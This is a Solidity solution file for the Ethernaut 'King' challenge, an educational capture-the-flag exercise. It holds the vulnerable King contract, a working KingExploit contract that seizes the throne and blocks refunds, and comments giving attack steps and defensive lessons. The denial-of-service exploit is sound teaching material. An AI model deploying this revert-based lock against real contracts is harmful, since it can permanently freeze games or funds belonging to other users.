// Ethernaut Challenge #9: King
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * KING CHALLENGE
 * 
 * Goal: Become king and prevent anyone else from taking the throne.
 * 
 * THE VULNERABILITY:
 * The contract sends ETH back to the old king using transfer()
 * before updating state. If the old king is a contract that
 * reverts on receive, the entire transaction reverts.
 * 
 * This is a Denial of Service (DoS) via revert.
 * 
 * EXPLOIT STRATEGY:
 * 1. Become king by sending > current prize
 * 2. Ensure our contract can't receive ETH (no receive/fallback)
 * 3. When someone tries to overthrow us, the transfer() fails
 * 4. Game is permanently locked — we're king forever
 */

contract KingExploit {
    address public target;
    
    constructor(address _target) payable {
        target = _target;
        // Become king immediately
        uint prize = King(_target).prize();
        (bool success,) = _target.call{value: prize + 1}("");
        require(success, "Failed to become king");
    }
    
    // NO receive() function!
    // When King tries to transfer() ETH back, it will revert
}

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        // VULNERABILITY: External call before state update
        payable(king).transfer(msg.value); // ← Reverts if king can't receive
        king = msg.sender;
        prize = msg.value;
    }
}

/*
 * ATTACK STEPS:
 * 1. Check current prize: await contract.prize()
 * 2. Deploy KingExploit with value = prize + 1 wei
 * 3. Exploit contract becomes king
 * 4. Anyone else trying to claim reverts (can't send ETH to us)
 * 
 * LESSON:
 * - Avoid external calls before state updates (checks-effects-interactions)
 * - transfer() and send() can fail against contracts
 * - Consider pull over push for payments
 */
